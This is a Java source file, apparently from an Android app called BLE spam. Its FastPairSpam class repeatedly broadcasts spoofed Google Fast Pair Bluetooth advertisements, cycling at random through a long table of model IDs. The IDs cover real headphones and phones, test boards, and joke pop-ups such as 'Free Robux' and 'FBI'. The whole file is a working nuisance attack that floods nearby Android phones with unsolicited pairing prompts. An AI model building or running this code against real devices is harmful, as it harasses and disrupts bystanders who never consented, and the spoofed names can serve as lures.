package com.tutozz.blespam;

import android.bluetooth.le.AdvertiseData;
import android.os.Handler;
import android.os.Looper;
import android.os.ParcelUuid;
import java.util.UUID;
import java.util.Random;

/**
 * Implements Google Fast Pair spamming logic using a non-blocking Handler for cycling.
 * Extends the abstract Spammer class.
 * The advertisement data is pre-calculated for efficiency.
 */
// 1. EXTENDS Spammer instead of IMPLEMENTS
public class FastPairSpam extends Spammer {

    public FastPairDevice[] devices;
    public AdvertiseData[] devicesAdvertiseData;

    // Handler for scheduling the advertising cycle (must run on Main Looper)
    private final Handler spamHandler = new Handler(Looper.getMainLooper());
    private final BluetoothAdvertiser advertiser = new BluetoothAdvertiser();

    // 2. Define the repeating advertising task
    private final Runnable advertisingRunnable = new newFastPairAdvertisingRunnable();

    // Inner class to define the advertising logic
    private class newFastPairAdvertisingRunnable implements Runnable {
        @Override
        public void run() {
            if (!isSpamming) {
                // Self-terminate if stop() was called while waiting for next run
                return;
            }

            // 3. Spammer Logic
            // Randomly select one of the pre-built AdvertiseData objects
            Random random = Helper.RANDOM_THREAD_LOCAL.get();
            AdvertiseData data = devicesAdvertiseData[random.nextInt(devices.length)];

            // Advertise, then immediately stop to prepare for the next cycle
            advertiser.advertise(data, null);
            advertiser.stopAdvertising();

            // 4. Schedule the next run after the user-defined delay
            // We use uiBlinkDelay (the user-controlled setting) to set the advertisement rate.
            spamHandler.postDelayed(this, Helper.uiBlinkDelay);
        }
    }

    public FastPairSpam(){
        // Init FastPairDevices
        devices = new FastPairDevice[]{
                // Genuine non-production/forgotten (good job Google)
                new FastPairDevice("0x0001F0", "Bisto CSR8670 Dev Board"),
                new FastPairDevice("0x000047", "Arduino 101"),
                new FastPairDevice("0x470000", "Arduino 101 2"),
                new FastPairDevice("0x00000A", "Anti-Spoof Test"),
                new FastPairDevice("0x0A0000", "Anti-Spoof Test 2"),
                new FastPairDevice("0x00000B", "Google Gphones"),
                new FastPairDevice("0x0B0000", "Google Gphones 2"),
                new FastPairDevice("0x0C0000", "Google Gphones 3"),
                new FastPairDevice("0x00000D", "Test 00000D"),
                new FastPairDevice("0x000007", "Android Auto"),
                new FastPairDevice("0x070000", "Android Auto 2"),
                new FastPairDevice("0x000008", "Foocorp Foophones"),
                new FastPairDevice("0x080000", "Foocorp Foophones 2"),
                new FastPairDevice("0x000009", "Test Android TV"),
                new FastPairDevice("0x090000", "Test Android TV 2"),
                new FastPairDevice("0x000035", "Test 000035"),
                new FastPairDevice("0x350000", "Test 000035 2"),
                new FastPairDevice("0x000048", "Fast Pair Headphones"),
                new FastPairDevice("0x480000", "Fast Pair Headphones 2"),
                new FastPairDevice("0x000049", "Fast Pair Headphones 3"),
                new FastPairDevice("0x490000", "Fast Pair Headphones 4"),
                new FastPairDevice("0x001000", "LG HBS1110"),
                new FastPairDevice("0x00B727", "Smart Controller 1"),
                new FastPairDevice("0x01E5CE", "BLE-Phone"),
                new FastPairDevice("0x0200F0", "Goodyear"),
                new FastPairDevice("0x00F7D4", "Smart Setup"),
                new FastPairDevice("0xF00002", "Goodyear"),
                new FastPairDevice("0xF00400", "T10"),
                new FastPairDevice("0x1E89A7", "ATS2833_EVB"),
                // Phone setup
                new FastPairDevice("0x00000C", "Google Gphones Transfer"),
                new FastPairDevice("0x0577B1", "Galaxy S23 Ultra"),
                new FastPairDevice("0x05A9BC", "Galaxy S20+"),
                // Genuine devices
                new FastPairDevice("0xCD8256", "Bose NC 700"),
                new FastPairDevice("0x0000F0", "Bose QuietComfort 35 II"),
                new FastPairDevice("0xF00000", "Bose QuietComfort 35 II 2"),
                new FastPairDevice("0x821F66", "JBL Flip 6"),
                new FastPairDevice("0xF52494", "JBL Buds Pro"),
                new FastPairDevice("0x718FA4", "JBL Live 300TWS"),
                new FastPairDevice("0x0002F0", "JBL Everest 110GA"),
                new FastPairDevice("0x92BBBD", "Pixel Buds"),
                new FastPairDevice("0x000006", "Google Pixel buds"),
                new FastPairDevice("0x060000", "Google Pixel buds 2"),
                new FastPairDevice("0xD446A7", "Sony XM5"),
                new FastPairDevice("0x2D7A23", "Sony WF-1000XM4"),
                new FastPairDevice("0x0E30C3", "Razer Hammerhead TWS"),
                new FastPairDevice("0x72EF8D", "Razer Hammerhead TWS X"),
                new FastPairDevice("0x72FB00", "Soundcore Spirit Pro GVA"),
                new FastPairDevice("0x0003F0", "LG HBS-835S"),
                new FastPairDevice("0x002000", "AIAIAI TMA-2 (H60)"),
                new FastPairDevice("0x003000", "Libratone Q Adapt On-Ear"),
                new FastPairDevice("0x003001", "Libratone Q Adapt On-Ear 2"),
                new FastPairDevice("0x00A168", "boAt Airdopes 621"),
                new FastPairDevice("0x00AA48", "Jabra Elite 2"),
                new FastPairDevice("0x00AA91", "Beoplay E8 2.0"),
                new FastPairDevice("0x00C95C", "Sony WF-1000X"),
                new FastPairDevice("0x01EEB4", "WH-1000XM4"),
                new FastPairDevice("0x02AA91", "B&O Earset"),
                new FastPairDevice("0x01C95C", "Sony WF-1000X"),
                new FastPairDevice("0x02D815", "ATH-CK1TW"),
                new FastPairDevice("0x035764", "PLT V8200 Series"),
                new FastPairDevice("0x038CC7", "JBL TUNE760NC"),
                new FastPairDevice("0x02DD4F", "JBL TUNE770NC"),
                new FastPairDevice("0x02E2A9", "TCL MOVEAUDIO S200"),
                new FastPairDevice("0x035754", "Plantronics PLT_K2"),
                new FastPairDevice("0x02C95C", "Sony WH-1000XM2"),
                new FastPairDevice("0x038B91", "DENON AH-C830NCW"),
                new FastPairDevice("0x02F637", "JBL LIVE FLEX"),
                new FastPairDevice("0x02D886", "JBL REFLECT MINI NC"),
                new FastPairDevice("0xF00000", "Bose QuietComfort 35 II"),
                new FastPairDevice("0xF00001", "Bose QuietComfort 35 II"),
                new FastPairDevice("0xF00201", "JBL Everest 110GA"),
                new FastPairDevice("0xF00204", "JBL Everest 310GA"),
                new FastPairDevice("0xF00209", "JBL LIVE400BT"),
                new FastPairDevice("0xF00205", "JBL Everest 310GA"),
                new FastPairDevice("0xF00200", "JBL Everest 110GA"),
                new FastPairDevice("0xF00208", "JBL Everest 710GA"),
                new FastPairDevice("0xF00207", "JBL Everest 710GA"),
                new FastPairDevice("0xF00206", "JBL Everest 310GA"),
                new FastPairDevice("0xF0020A", "JBL LIVE400BT"),
                new FastPairDevice("0xF0020B", "JBL LIVE400BT"),
                new FastPairDevice("0xF0020C", "JBL LIVE400BT"),
                new FastPairDevice("0xF00203", "JBL Everest 310GA"),
                new FastPairDevice("0xF00202", "JBL Everest 110GA"),
                new FastPairDevice("0xF00213", "JBL LIVE650BTNC"),
                new FastPairDevice("0xF0020F", "JBL LIVE500BT"),
                new FastPairDevice("0xF0020E", "JBL LIVE500BT"),
                new FastPairDevice("0xF00214", "JBL LIVE650BTNC"),
                new FastPairDevice("0xF00212", "JBL LIVE500BT"),
                new FastPairDevice("0xF0020D", "JBL LIVE400BT"),
                new FastPairDevice("0xF00211", "JBL LIVE500BT"),
                new FastPairDevice("0xF00215", "JBL LIVE650BTNC"),
                new FastPairDevice("0xF00210", "JBL LIVE500BT"),
                new FastPairDevice("0xF00305", "LG HBS-1500"),
                new FastPairDevice("0xF00304", "LG HBS-1010"),
                new FastPairDevice("0xF00308", "LG HBS-1125"),
                new FastPairDevice("0xF00303", "LG HBS-930"),
                new FastPairDevice("0xF00306", "LG HBS-1700"),
                new FastPairDevice("0xF00300", "LG HBS-835S"),
                new FastPairDevice("0xF00309", "LG HBS-2000"),
                new FastPairDevice("0xF00302", "LG HBS-830"),
                new FastPairDevice("0xF00307", "LG HBS-1120"),
                new FastPairDevice("0xF00301", "LG HBS-835"),
                new FastPairDevice("0xF00E97", "JBL VIBE BEAM"),
                new FastPairDevice("0x04ACFC", "JBL WAVE BEAM"),
                new FastPairDevice("0x04AA91", "Beoplay H4"),
                new FastPairDevice("0x04AFB8", "JBL TUNE 720BT"),
                new FastPairDevice("0x05A963", "WONDERBOOM 3"),
                new FastPairDevice("0x05AA91", "B&O Beoplay E6"),
                new FastPairDevice("0x05C452", "JBL LIVE220BT"),
                new FastPairDevice("0x05C95C", "Sony WI-1000X"),
                new FastPairDevice("0x0602F0", "JBL Everest 310GA"),
                new FastPairDevice("0x0603F0", "LG HBS-1700"),
                new FastPairDevice("0x1E8B18", "SRS-XB43"),
                new FastPairDevice("0x1E955B", "WI-1000XM2"),
                new FastPairDevice("0x1EC95C", "Sony WF-SP700N"),
                new FastPairDevice("0x1ED9F9", "JBL WAVE FLEX"),
                new FastPairDevice("0x1EE890", "ATH-CKS30TW WH"),
                new FastPairDevice("0x1EEDF5", "Teufel REAL BLUE TWS 3"),
                new FastPairDevice("0x1F1101", "TAG Heuer Calibre E4 45mm"),
                new FastPairDevice("0x1F181A", "LinkBuds S"),
                new FastPairDevice("0x1F2E13", "Jabra Elite 2"),
                new FastPairDevice("0x1F4589", "Jabra Elite 2"),
                new FastPairDevice("0x1F4627", "SRS-XG300"),
                new FastPairDevice("0x1F5865", "boAt Airdopes 441"),
                new FastPairDevice("0x1FBB50", "WF-C700N"),
                new FastPairDevice("0x1FC95C", "Sony WF-SP700N"),
                new FastPairDevice("0x1FE765", "TONE-TF7Q"),
                new FastPairDevice("0x1FF8FA", "JBL REFLECT MINI NC"),
                new FastPairDevice("0x201C7C", "SUMMIT"),
                new FastPairDevice("0x202B3D", "Amazfit PowerBuds"),
                new FastPairDevice("0x20330C", "SRS-XB33"),
                new FastPairDevice("0x003B41", "M&D MW65"),
                new FastPairDevice("0x003D8B", "Cleer FLOW II"),
                new FastPairDevice("0x005BC3", "Panasonic RP-HD610N"),
                new FastPairDevice("0x008F7D", "soundcore Glow Mini"),
                new FastPairDevice("0x00FA72", "Pioneer SE-MS9BN"),
                new FastPairDevice("0x0100F0", "Bose QuietComfort 35 II"),
                new FastPairDevice("0x011242", "Nirvana Ion"),
                new FastPairDevice("0x013D8B", "Cleer EDGE Voice"),
                new FastPairDevice("0x01AA91", "Beoplay H9 3rd Generation"),
                new FastPairDevice("0x038F16", "Beats Studio Buds"),
                new FastPairDevice("0x039F8F", "Michael Kors Darci 5e"),
                new FastPairDevice("0x03AA91", "B&O Beoplay H8i"),
                new FastPairDevice("0x03B716", "YY2963"),
                new FastPairDevice("0x03C95C", "Sony WH-1000XM2"),
                new FastPairDevice("0x03C99C", "MOTO BUDS 135"),
                new FastPairDevice("0x03F5D4", "Writing Account Key"),
                new FastPairDevice("0x045754", "Plantronics PLT_K2"),
                new FastPairDevice("0x045764", "PLT V8200 Series"),
                new FastPairDevice("0x04C95C", "Sony WI-1000X"),
                new FastPairDevice("0x050F0C", "Major III Voice"),
                new FastPairDevice("0x052CC7", "MINOR III"),
                new FastPairDevice("0x057802", "TicWatch Pro 5"),
                new FastPairDevice("0x0582FD", "Pixel Buds"),
                new FastPairDevice("0x058D08", "WH-1000XM4"),
                new FastPairDevice("0x06AE20", "Galaxy S21 5G"),
                new FastPairDevice("0x06C197", "OPPO Enco Air3 Pro"),
                new FastPairDevice("0x06C95C", "Sony WH-1000XM2"),
                new FastPairDevice("0x06D8FC", "soundcore Liberty 4 NC"),
                new FastPairDevice("0x0744B6", "Technics EAH-AZ60M2"),
                new FastPairDevice("0x07A41C", "WF-C700N"),
                new FastPairDevice("0x07C95C", "Sony WH-1000XM2"),
                new FastPairDevice("0x07F426", "Nest Hub Max"),
                new FastPairDevice("0x0102F0", "JBL Everest 110GA - Gun Metal"),
                new FastPairDevice("0x0202F0", "JBL Everest 110GA - Silver"),
                new FastPairDevice("0x0302F0", "JBL Everest 310GA - Brown"),
                new FastPairDevice("0x0402F0", "JBL Everest 310GA - Gun Metal"),
                new FastPairDevice("0x0502F0", "JBL Everest 310GA - Silver"),
                new FastPairDevice("0x0702F0", "JBL Everest 710GA - Gun Metal"),
                new FastPairDevice("0x0802F0", "JBL Everest 710GA - Silver"),
                new FastPairDevice("0x054B2D", "JBL TUNE125TWS"),
                new FastPairDevice("0x0660D7", "JBL LIVE770NC"),
                new FastPairDevice("0x0103F0", "LG HBS-835"),
                new FastPairDevice("0x0203F0", "LG HBS-830"),
                new FastPairDevice("0x0303F0", "LG HBS-930"),
                new FastPairDevice("0x0403F0", "LG HBS-1010"),
                new FastPairDevice("0x0503F0", "LG HBS-1500"),
                new FastPairDevice("0x0703F0", "LG HBS-1120"),
                new FastPairDevice("0x0803F0", "LG HBS-1125"),
                new FastPairDevice("0x0903F0", "LG HBS-2000"),
                // Custom debug popups
                new FastPairDevice("0xD99CA1", "Flipper Zero"),
                new FastPairDevice("0x77FF67", "Free Robux"),
                new FastPairDevice("0xAA187F", "Free VBucks"),
                new FastPairDevice("0xDCE9EA", "Rickroll"),
                new FastPairDevice("0x87B25F", "Animated Rickroll"),
                new FastPairDevice("0xF38C02", "Boykisser"),
                new FastPairDevice("0x1448C9", "BLM"),
                new FastPairDevice("0xD5AB33", "Xtreme"),
                new FastPairDevice("0x0C0B67", "Xtreme Cta"),
                new FastPairDevice("0x13B39D", "Talking Sasquach"),
                new FastPairDevice("0xAA1FE1", "ClownMaster"),
                new FastPairDevice("0x7C6CDB", "Obama"),
                new FastPairDevice("0x005EF9", "Ryanair"),
                new FastPairDevice("0xE2106F", "FBI"),
                new FastPairDevice("0xB37A62", "Tesla")
        };

        // Init all possible AdvertiseData
        // Fast Pair Service UUID: 0000FE2C-0000-1000-8000-00805F9B34FB
        ParcelUuid serviceUUID = new ParcelUuid(UUID.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"));
        devicesAdvertiseData = new AdvertiseData[devices.length];
        for(int i = 0; i < devices.length; i++) {
            FastPairDevice device = devices[i];
            // The service data is the device Model ID (3 bytes)
            byte[] serviceData = Helper.convertHexToByteArray(device.getValue());
            devicesAdvertiseData[i] = new AdvertiseData.Builder()
                    .addServiceData(serviceUUID, serviceData)
                    .addServiceUuid(serviceUUID)
                    // TxPower is recommended for accurate distance estimation by the receiver
                    .setIncludeTxPowerLevel(true)
                    .build();
        }
    }

    // 5. Implements abstract start() method
    @Override
    public void start() {
        if (isSpamming) return;

        // Use the inherited field
        isSpamming = true;

        // Start the first advertising cycle immediately
        spamHandler.post(advertisingRunnable);
    }

    // 6. Implements abstract stop() method
    @Override
    public void stop() {
        if (!isSpamming) return;

        // Stop the scheduling immediately
        spamHandler.removeCallbacks(advertisingRunnable);

        // Stop the currently running advertisement
        advertiser.stopAdvertising();

        // Use the inherited field
        isSpamming = false;
    }
    
    // 7. Removed: isSpamming(), getBlinkRunnable(), setBlinkRunnable(), loop, executor
    // All handled by the abstract Spammer base class.
}
